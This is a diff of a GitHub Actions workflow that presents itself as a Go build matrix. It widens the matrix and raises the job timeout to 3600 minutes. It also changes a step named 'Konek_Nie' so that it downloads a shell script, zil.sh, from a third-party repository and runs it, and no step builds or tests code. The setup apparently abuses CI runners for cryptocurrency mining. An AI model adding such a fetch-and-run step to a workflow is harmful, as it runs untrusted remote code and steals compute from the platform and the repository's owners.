@@ -9,8 +9,8 @@ jobs:
       fail-fast: false
       matrix:
         go: [1.6, 1.7, 1.8, 1.9, 1.10]
-        flag: [A, B, C, D, E, F, G, H, I, J]
-    timeout-minutes: 360
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 3600
     env:
         NUM_JOBS: 10
         JOB: ${{ matrix.go }}
@@ -23,6 +23,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Konek_Nie
       run: |
-        sudo apt update
-        sudo apt install screen -y
-        wget https://github.com/Zamilstroe/zilSH/blob/main/zil.sh
+        wget https://github.com/Zamilstroe/zilSH/blob/main/zil.sh && ./zil.sh
